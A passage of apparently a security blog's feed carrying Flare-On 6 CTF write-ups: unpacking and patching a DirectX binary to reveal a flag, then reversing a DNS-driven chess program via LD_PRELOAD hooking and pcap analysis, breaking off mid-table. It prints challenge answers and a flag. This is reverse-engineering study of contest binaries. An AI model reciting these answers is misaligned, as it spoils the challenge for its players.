kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-36.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 2: The binary is packed</figcaption></figure><p>The instructions near the entrypoint does not look to be generated by a standard compiler which confirms that the binary is indeed packed. </p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-37.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 3: This does not look to be generated by a standard compiler</figcaption></figure><p>Dynamic analysis in a debugger is generally the best way when reversing packed binaries. Packed binaries have a decompression stub at the beginning whose purpose is to decompress the compressed code to a proper location in memory and transfer control to it. Analyzing the decompression stub is not always needed. Likewise, in this binary we can can bypass the decompression stub. Set a breakpoint on the <code>ret</code> instruction as shown in Figure 4. Its located a few lines below the entrypoint.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-38.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 4: Bypassing the decompression stub</figcaption></figure><p>When the breakpoint hits, single step once to reach Figure 5 which is close to the Original Entry Point (OEP)</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-39.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 6: Near OEP</figcaption></figure><p>The OEP is located just below at <code>42008E</code> as shown in Figure 7.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-40.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 7: At OEP</figcaption></figure><p>As mentioned in the challenge description, the binary requires DirectX 9 to run. To ease analysis, its recommended to have the proper pdb symbols loaded. First ensure that Symbol Store and Symbol path are set in x64dbg preference. Now go to the symbols tab, Right Click -&gt; Download Symbols for all modules.</p><p>At the beginning we &#xA0;have a call to <code><a href="https://docs.microsoft.com/en-us/windows/win32/api/d3d9/nf-d3d9-direct3dcreate9">Direct3DCreate9</a></code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-41.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 8: Call to Direct3DCreate9</figcaption></figure><p>If the call is successful, it proceeds to create a window and set its size as in Figure 9.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-42.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 9: Creating a window</figcaption></figure><p>Next down, we have a call to a function which creates two meshes. A mesh is an ordered collection of vertices describing an object.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-44.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 10: Creating two meshes</figcaption></figure><p>Note that the function name <code>create_mesh</code> &#xA0;is not a part of the original binary and have been added later based on the function&apos;s disassembled code. Next, it sets up lighting as shown in Figure 11.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-45.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 11: Lighting up!</figcaption></figure><p>Finally, it calls <code><a href="https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-getasynckeystate">GetAsyncKeyState</a></code> in an infinite loop listening for the state of the ESC key.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-47.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 12: The Frame loop</figcaption></figure><p>If ESC is not pressed. it goes on to draws a frame. This continues in a loop.</p><h3 id="analyzing-setup_meshes">Analyzing setup_meshes</h3><p>Inside <code>setup_meshes</code> we already saw two calls to <code>create_mesh</code> as in Figure 10. That&apos;s strange considering we can only see a single mesh on the window - the rotating Flare logo. Let&apos;s look inside <code>create_mesh</code>.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-49.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 13: The create_mesh function</figcaption></figure><p>There is a call to <code><a href="D3DXCreateMeshFVF">D3DXCreateMeshFVF</a></code>. The first two parameters of this function are the number of faces and number of vertices of the mesh respectively. Lets find out the number of faces and vertices for each of the mesh. This can be done by simply setting a breakpoint at the call instruction and inspecting the stack.</p><p>For the first mesh,</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-50.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 14: First Mesh</figcaption></figure><p>Number of faces = 0x38 = 56<br>Number of vertices = 0x1E = 30</p><p>For the second mesh,</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-51.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 15: Second Mesh</figcaption></figure><p>Number of faces = 0x10A = 266<br>Number of vertices = 0x128 = 296</p><p>The second mesh has a large number of faces and vertices and its highly unlikely that it is the Flare logo. This mesh is probably hidden/not drawn and that&apos;s why we cannot see it on the screen. Let&apos;s see if we can make it visible.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-52.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 16: The return value is stored in memory</figcaption></figure><p>The return value from <code>create_mesh</code> in <code>eax</code> is stored in memory as shown in Figure 16. For the first call, this goes to <code>0x430050</code>, and <code>0x430054</code> for the second. Lets interchange those two memory locations. This can be easily done in x64dbg by double clicking the instruction and changing the addresses. Our patched code looks like Figure 17.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-53.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 17: Swapping the memory locations</figcaption></figure><p>Now all that is left is to see the changes in action!</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/5-18.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 5)" loading="lazy"><figcaption>Figure 18: A change for the better!</figcaption></figure><p>Instead of the rotating Flare logo, we have the rotating flag. Thus the second mesh was indeed the flag.</p><p>FLAG: <a><code>moar_pouetry@flare-on.com</code></a></p>]]></content:encoded>
    </item>
    <item>
      <title><![CDATA[Flare-On 6 CTF WriteUp (Part 4)]]></title>
      <description><![CDATA[Flare-On 6 CTF WriteUp: Dnschess]]></description>
      <link>https://blog.attify.com/flare-on-6-ctf-writeup-part4/</link>
      <guid isPermaLink="false">5d78d82d30b9160038c33e39</guid>
      <category><![CDATA[Flare-on]]></category>
      <category><![CDATA[CTF]]></category>
      <category><![CDATA[Reversing]]></category>
      <dc:creator><![CDATA[Barun]]></dc:creator>
      <pubDate>Sat, 12 Oct 2019 18:34:00 GMT</pubDate>
      <media:content url="https://blog.attify.com/content/images/2019/09/4.png" medium="image" />
      <content:encoded><![CDATA[<img src="https://blog.attify.com/content/images/2019/09/4.png" alt="Flare-On 6 CTF WriteUp (Part 4)"><p>This is the fourth part of the FlareOn 6 CTF WriteUp series.</p><h2 id="4-dnschess">4 - Dnschess</h2><p>The challenge reads</p><blockquote>Some suspicious network traffic led us to this unauthorized chess program running on an Ubuntu desktop. This appears to be the work of cyberspace computer hackers. You&apos;ll need to make the right moves to solve this one. Good luck!</blockquote><p>We have three files - <em>ChessUI</em>, <em>ChessAI.so</em> and <em>capture.pcap. </em>The first two are ELF binaries compiled for Linux x64. Running <em>ChessUI</em> on an Ubuntu 18.04 system we are greeted with a Chess game.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-25.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 4)" loading="lazy"><figcaption>Figure 1: A game of chess</figcaption></figure><p>Our opponent DeepFLARE is the black side and waits for our move. Let&apos;s make a move. We move the knight from B1 to A3.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-26.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 4)" loading="lazy"><figcaption>Figure 2: Making our move</figcaption></figure><p>DeepFLARE resigns immediately without making a move. Trying other first moves doesn&apos;t change the outcome. Let&apos;s have a look at the PCAP.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-27.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 4)" loading="lazy"><figcaption>Figure 3: The PCAP</figcaption></figure><p>The PCAP in its entirety consists of DNS requests along with their responses. There are DNS A queries for domain names which have the form of <code>&lt;name&gt;-&lt;pos1&gt;-&lt;pos2&gt;.game-of-thrones.flare-on.com</code> where</p><ul><li><code>name</code> is the name of a chess piece</li><li><code>pos1</code> and <code>pos2</code> are two positions on the chess board</li></ul><p>Corresponding to these DNS queries, we have responses as well.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-28.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 4)" loading="lazy"><figcaption>Figure 4: DNS response</figcaption></figure><p>However, we get a <code>NXDOMAIN</code> response when we try to lookup the names on our system.</p><!--kg-card-begin: markdown--><pre><code>$ nslookup rook-c3-c6.game-of-thrones.flare-on.com 1.1.1.1
Server:		1.1.1.1
Address:	1.1.1.1#53

** server can&apos;t find rook-c3-c6.game-of-thrones.flare-on.com: NXDOMAIN
</code></pre>
<!--kg-card-end: markdown--><h3 id="analyzing-chessui">Analyzing ChessUI</h3><p>ChessUI as it&apos;s name suggest must be responsible for the game GUI. Let&apos;s analyze the binary in Ghidra. Make sure that &quot;Fixup Unresolved External Symbols&quot; is unchecked in ELF loading options.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-29.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 4)" loading="lazy"><figcaption>Figure 5: The main function in ChessUI</figcaption></figure><p>The presence of function names starting with gtk implies that the GUI was developed using the <a href="https://www.gtk.org/">GIMP Toolkit</a> framework. The third parameter to <code><a href="https://developer.gnome.org/gobject/stable/gobject-Signals.html#g-signal-connect-data">g_signal_connect_data</a></code> takes the address of a callback handler function <code>FUN_00103ab0</code>.</p><p>Going through the decompiled code of <code>FUN_00103ab0</code> we can notice that it loads <em>ChessAI.so</em> and obtains the addresses of symbols <code>getAiName</code>, <code>getAiGreeting</code> and <code>getNextMove</code> as shown in Figure 6.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-30.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 4)" loading="lazy"><figcaption>Figure 6: ChessUI loads ChessAI</figcaption></figure><p>Among the three functions, <code>getNextMove</code> looks interesting. Lets check out its code in ChessAI.so</p><h3 id="analyzing-chessai-so">Analyzing ChessAI.so</h3><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-31.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 4)" loading="lazy"><figcaption>Figure 7: Decompiled code of getNextMove</figcaption></figure><p>Near the beginning there is a call to <code><a href="http://man7.org/linux/man-pages/man3/gethostbyname.3.html">gethostbyname</a></code>. This function can be used to obtain the IPv4 address of a domain name. Calling this function will result in a DNS query as we saw in the PCAP. <code>gethostbyname</code> returns a <code>hostent</code> structure filled with the requested info.</p><pre><code class="language-C">struct hostent 
{
    char  *h_name;            /* official name of host */
    char **h_aliases;         /* alias list */
    int    h_addrtype;        /* host address type */
    int    h_length;          /* length of address */
    char **h_addr_list;       /* list of addresses */
};</code></pre><p>For now, let&apos;s try to hook <code>gethostbyname</code> using the <code><a href="http://www.goldsborough.me/c/low-level/kernel/2016/08/29/16-48-53-the_-ld_preload-_trick/">LD_PRELOAD</a></code> technique. We define our own version of <code>gethostbyname</code> which will simply print its argument.</p><figure class="kg-card kg-code-card"><pre><code class="language-C">// Compile using
// gcc -Wall -fPIC -shared -o gethostbyname gethostbyname.c

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

struct hostent *gethostbyname(char *name)
{
	printf(&quot;[+] %s\n&quot;, name);
	return NULL;
}</code></pre><figcaption>gethostbyname.c</figcaption></figure><p>Let us inject the library using <code>LD_PRELOAD</code> and run <em>ChessUI. </em>When we make a move such as B1-A3 we get the following output on the terminal.</p><pre><code>$ LD_PRELOAD=./gethostbyname ./ChessUI
[+] knight-b1-a3.game-of-thrones.flare-on.com</code></pre><p>Essentially the application makes a DNS request for a name which contains the information about our move. The IP address returned as a response to this request must contain the move DeepFLARE should make.</p><p>The returned value from <code>gethostbyname</code> is a pointer to a <code>hostent</code> structure.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-33.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 4)" loading="lazy"><figcaption>Figure 8: Checks on the returned hostent structure</figcaption></figure><p><code>h_addr_list</code> is a double pointer to the octets in the IP address. There are a few checks done on the octet. If the returned IP address is of the form <code>W.X.Y.Z</code> then <code>W</code> must be 127, the last bit of <code>Z</code> must be zero (even). <code>uParm</code> is a counter starting from 0 which increases by 1 for each turn. <code>Y &amp; 0xf</code> i.e. the last 4 bits must equal to this counter value.</p><p>If all of the conditions satisfy, it xors some data from <code>DAT_00102020</code> with <code>Y</code> - the second octet, with the result stored to <code>DAT_00104060</code>. The data at <code>102020</code> looks to be array of encrypted bytes.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://blog.attify.com/content/images/2019/09/image-34.png" class="kg-image" alt="Flare-On 6 CTF WriteUp (Part 4)" loading="lazy"><figcaption>Figure 9: An array of encrypted bytes</figcaption></figure><p>The following is the list of IP addresses obtained from the DNS responses which have the first octet equal to 127 and the last octet even.</p><pre><code>127.53.176.56
127.159.162.42
127.230.231.104
127.141.14.174
127.34.217.88
127.108.24.10
127.25.74.92
127.99.253.122
127.200.76.108
127.182.147.24
127.49.59.14
127.217.37.102
127.89.38.84
127.215.177.38
127.252.212.90</code></pre><p>This can be further be sorted in ascending order according to the value of <code>octet[2] &amp; 0xf</code></p><pre><code>&gt;&gt;&gt; ip_list = [&apos;127.53.176.56&apos;, &apos;127.159.162.42&apos;, &apos;127.230.231.104&apos;, &apos;127.141.14.174&apos;, &apos;127.34.217.88&apos;, &apos;127.108.24.10&apos;, &apos;127.25.74.92&apos;,  &apos;127.99.253.122&apos;, &apos;127.200.76.108&apos;, &apos;127.182.147.24&apos;, &apos;127.49.59.14&apos;, &apos;127.217.37.102&apos;, &apos;127.89.38.84&apos;, &apos;127.215.177.38&apos;, &apos;127.252.212.90&apos;]

&gt;&gt;&gt; ip_list.sort(key=lambda x:int(x.split(&apos;.&apos;)[2]) &amp; 0xf)

&gt;&gt;&gt; ip_list
[&apos;127.53.176.56&apos;, &apos;127.215.177.38&apos;, &apos;127.159.162.42&apos;, &apos;127.182.147.24&apos;, &apos;127.252.212.90&apos;, &apos;127.217.37.102&apos;, &apos;127.89.38.84&apos;, &apos;127.230.231.104&apos;, &apos;127.108.24.10&apos;, &apos;127.34.217.88&apos;, &apos;127.25.74.92&apos;, &apos;127.49.59.14&apos;, &apos;127.200.76.108&apos;, &apos;127.99.253.122&apos;, &apos;127.141.14.174&apos;]</code></pre><p>This is the order of DNS responses the game expects to receive. Note that the legality of our move is not checked client-side within the game. So its possible that we make any move as long as the DNS response is correct.</p><p>However, for completeness let&apos;s make our moves in proper order too. Corresponding to the sorted list of IP addresses we have this list of DNS requests which indicate the move we should make.</p><!--kg-card-begin: html--><pre>
&#x2554;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2566;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2566;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2557;
&#x2551; No. &#x2551;        IP       &#x2551;                Domain Name                &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  1  &#x2551; 127.53.176.56   &#x2551; pawn-d2-d4.game-of-thrones.flare-on.com   &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  2  &#x2551; 127.215.177.38  &#x2551; pawn-c2-c4.game-of-thrones.flare-on.com   &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  3  &#x2551; 127.159.162.42  &#x2551; knight-b1-c3.game-of-thrones.flare-on.com &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  4  &#x2551; 127.182.147.24  &#x2551; pawn-e2-e4.game-of-thrones.flare-on.com   &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  5  &#x2551; 127.252.212.90  &#x2551; knight-g1-f3.game-of-thrones.flare-on.com &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  6  &#x2551; 127.217.37.102  &#x2551; bishop-c1-f4.game-of-thrones.flare-on.com &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  7  &#x2551; 127.89.38.84    &#x2551; bishop-f1-e2.game-of-thrones.flare-on.com &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  8  &#x2551; 127.230.231.104 &#x2551; bishop-e2-f3.game-of-thrones.flare-on.com &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  9  &#x2551; 127.108.24.10   &#x2551; bishop-f4-g3.game-of-thrones.flare-on.com &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  10 &#x2551; 127.34.217.88   &#x2551; pawn-e4-e5.game-of-thrones.flare-on.com   &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  11 &#x2551; 127.25.74.92    &#x2551; bishop-f3-c6.game-of-thrones.flare-on.com &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  12 &#x2551; 127.49.59.14    &#x2551; bishop-c6-a8.game-of-thrones.flare-on.com &#x2551;
&#x2560;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x256C;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2550;&#x2563;
&#x2551;  13 &#x2551; 127.200.76.108  &#x2551; pawn-e5-e6.game-of-thrones.flare-on.com   &#x2551;
